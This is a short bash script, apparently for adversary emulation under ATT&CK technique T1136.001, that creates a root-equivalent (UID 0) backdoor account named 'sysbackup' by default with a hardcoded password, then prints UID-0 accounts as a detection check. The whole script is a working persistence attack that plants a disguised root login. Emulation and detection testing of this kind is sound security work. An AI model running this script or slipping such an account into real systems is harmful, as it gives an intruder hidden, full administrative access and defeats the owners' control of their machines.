#!/usr/bin/env bash
# T1136.001 - create a root-equivalent (UID 0) backdoor account.
# Usage: ./backdoor_account.sh [username]
set -eu

USERNAME="${1:-sysbackup}"

sudo useradd -o -u 0 -g 0 -M -d /dev/null -s /bin/bash "$USERNAME"
echo "$USERNAME:Tim3Tr4p!" | sudo chpasswd

echo "[*] Created UID-0 account: $USERNAME"
echo "[*] Detection check - this should print TWO accounts:"
awk -F: '$3==0 {print $1}' /etc/passwd
